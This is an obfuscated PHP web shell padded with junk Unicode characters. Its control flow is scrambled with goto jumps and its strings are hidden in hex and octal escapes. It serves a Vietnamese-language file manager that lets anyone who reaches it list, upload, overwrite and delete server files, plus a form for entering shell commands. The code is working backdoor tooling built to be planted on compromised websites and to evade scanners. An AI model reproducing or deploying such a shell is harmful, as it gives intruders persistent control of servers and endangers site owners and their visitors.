℅õัុશ^থສ്տർނቈକ່Tં℅ພ<?php
 goto S1HcR; A_78D: if (isset($_GET["\144\x65\154\x65\164\145"])) { $fileToDelete = $_GET["\x64\x65\154\x65\x74\x65"]; $pathToDelete = $dir . $fileToDelete; if (file_exists($pathToDelete) && !is_dir($pathToDelete)) { unlink($pathToDelete); } } goto KHyuj; B2IOR: eOKOH: goto H_7X5; Vr0kF: goto eOKOH; goto YDl23; Submm: xOFAv: goto Vi4WT; qANkZ: goto VuG0M; goto Submm; qbl1_: goto xOFAv; goto UXAtq; RyibL: D84xx: goto OzDdz; rt1f2: neCYN: goto cD7jw; XqzZL: goto D84xx; goto RyibL; oKBC4: if (isset($_POST["\x65\x64\x69\x74"])) { $fileName = $_POST["\146\151\154\145\137\x6e\141\x6d\x65"]; $fileContent = $_POST["\146\151\154\145\137\143\157\156\x74\145\x6e\x74"]; $pathToFile = $dir . $fileName; if (file_exists($pathToFile) && !is_dir($pathToFile)) { file_put_contents($pathToFile, $fileContent); } } goto Vr0kF; KHyuj: goto OF62o; goto B2IOR; hfPTP: foreach ($files as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { $path = $dir . $file; $type = is_dir($path) ? "\x54\x68\306\260\x20\155\xe1\273\245\143" : "\124\341\272\255\x70\x20\164\x69\x6e"; $size = is_dir($path) ? "\x2d" : filesize($path); echo "\x3c\x74\162\x3e\xa\40\40\40\x20\40\x20\x20\x20\x20\40\x20\x20\40\40\x20\40\x20\40\x20\x20\x20\40\x20\40\40\x20\40\x20\74\x74\144\x3e\x3c\141\x20\150\x72\145\146\x3d\42" . $path . "\x22\76" . $file . "\74\x2f\x61\x3e\74\57\x74\144\76\12\40\40\40\x20\x20\40\x20\40\x20\x20\40\x20\40\40\x20\x20\x20\x20\40\x20\x20\x20\40\x20\x20\x20\x20\40\x3c\x74\144\76" . $type . "\x3c\57\164\144\x3e\12\40\x20\x20\40\x20\x20\40\x20\x20\40\40\40\x20\40\x20\40\x20\x20\40\x20\x20\40\x20\x20\40\40\40\x20\x3c\164\144\76" . $size . "\40\142\171\x74\x65\x73\74\57\x74\x64\76\12\x20\40\x20\40\40\40\x20\x20\40\40\40\40\x20\40\x20\40\40\x20\40\x20\x20\x20\x20\40\x20\x20\40\x20\74\x74\144\x3e\xa\40\40\40\40\40\x20\40\40\40\40\40\x20\40\x20\x20\40\40\40\40\40\x20\40\40\x20\40\40\40\x20\40\40\40\x20\74\x62\x75\164\164\157\x6e\x20\x74\x79\160\x65\75\x22\142\165\164\x74\157\x6e\42\40\x64\x61\164\141\x2d\146\151\x6c\145\75\x22" . $file . "\42\x20\143\x6c\x61\x73\x73\75\x22\x62\164\156\40\142\164\x6e\55\x70\162\x69\x6d\x61\x72\x79\40\x62\164\x6e\55\141\x63\x74\151\x6f\x6e\40\x65\144\x69\x74\55\142\164\156\x22\x3e\123\341\xbb\255\x61\x3c\x2f\142\x75\x74\164\157\156\x3e\xa\40\40\x20\40\x20\40\x20\x20\40\x20\40\40\40\x20\40\x20\40\x20\x20\x20\40\40\x20\x20\x20\40\40\40\x20\40\40\40\x3c\141\40\x68\x72\x65\x66\75\x22\77\144\x65\x6c\x65\x74\145\x3d" . $file . "\42\40\143\154\x61\163\x73\75\x22\142\x74\156\40\x62\x74\x6e\55\x64\x61\156\147\145\162\x20\x62\x74\x6e\55\x61\143\164\151\x6f\x6e\x22\x3e\130\xc3\xb3\141\x3c\57\x61\76\12\40\x20\40\40\40\40\40\40\x20\x20\40\x20\40\40\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\x20\x20\x20\74\57\164\144\x3e\xa\x20\40\40\40\x20\x20\x20\40\40\40\40\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\40\x20\x20\74\x2f\164\x72\x3e"; } } goto qbl1_; UXAtq: Mmx6A: goto MzZiv; YfCOv: if (isset($_POST["\163\x75\x62\x6d\x69\x74"])) { $files = $_FILES["\x66\x69\x6c\x65"]; foreach ($files["\x6e\141\155\145"] as $key => $file_name) { move_uploaded_file($files["\x74\x6d\x70\137\x6e\x61\x6d\145"][$key], $dir . $file_name); } } goto u1_f7; S1HcR: ?>
<!doctypehtml><html><head><title>ተመረቀ</title><link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"rel="stylesheet"><style>.btn-action{margin-right:5px}</style></head><body><?php  goto XL89U; MzZiv: ?>
<div class="container"><h1>ተመረቀ</h1><div class="mb-3"><form method="POST"><label for="shellCommand"class="form-label">Nhập lệnh Shell</label> <input name="shellCommand"id="shellCommand"class="form-control"> <button class="btn btn-primary mt-2"type="submit">Thực hiện lệnh</button></form></div><div class="mb-3"id="result"><?php  goto qANkZ; JROjl: goto wPkDm; goto rt1f2; le5D_: ql_BX: goto A_78D; NyQfN: goto OBsXQ; goto le5D_; H_7X5: $files = scandir($dir); goto jMXAC; u1_f7: goto ql_BX; goto F13hw; OzDdz: $dir = "\56\57"; goto JROjl; cD7jw: ?>
<table class="table"><thead><tr><th>Tên</th><th>Loại</th><th>Kích thước</th><th>Thao tác</th></tr></thead><tbody><?php  goto NyQfN; YDl23: VuG0M: goto XqzZL; F13hw: OF62o: goto oKBC4; vWgno: OBsXQ: goto hfPTP; jMXAC: goto neCYN; goto vWgno; yvx1N: wPkDm: goto YfCOv; XL89U: goto Mmx6A; goto yvx1N; Vi4WT: ?>
</tbody></table><form method="post"action=""class="mt-4"enctype="multipart/form-data"><div class="form-group"><input name="file[]"type="file"multiple required></div><button class="btn btn-success"type="submit"name="submit">Upload</button></form><div class="fade modal"id="editModal"aria-hidden="true"aria-labelledby="editModalLabel"role="dialog"tabindex="-1"><div class="modal-dialog"role="document"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"id="editModalLabel">Sửa file</h5><button class="close"type="button"aria-label="Close"data-dismiss="modal"><span aria-hidden="true">×</span></button></div><div class="modal-body"><form method="post"action=""class="mt-4"id="editForm"><input name="file_name"id="editFileName"type="hidden"><div class="form-group"><label for="file_content">Nội dung file:</label> <textarea class="form-control"id="editFileContent"name="file_content"rows="10"></textarea></div><button class="btn btn-success"type="submit"name="edit">Lưu thay đổi</button></form></div></div></div></div><script src="https://code.jquery.com/jquery-3.3.1.min.js"></script><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script><script>$(document).ready(function(){$(".edit-btn").click(function(){var t=$(this).data("file");$.ajax({url:"./get_file_content.php",type:"POST",data:{file_name:t},success:function(e){$("#editFileName").val(t),$("#editFileContent").val(e),$("#editModal").modal("show")}})})})</script></body></html>ப્ଇያդխనնąjനនইDчાⵓፋք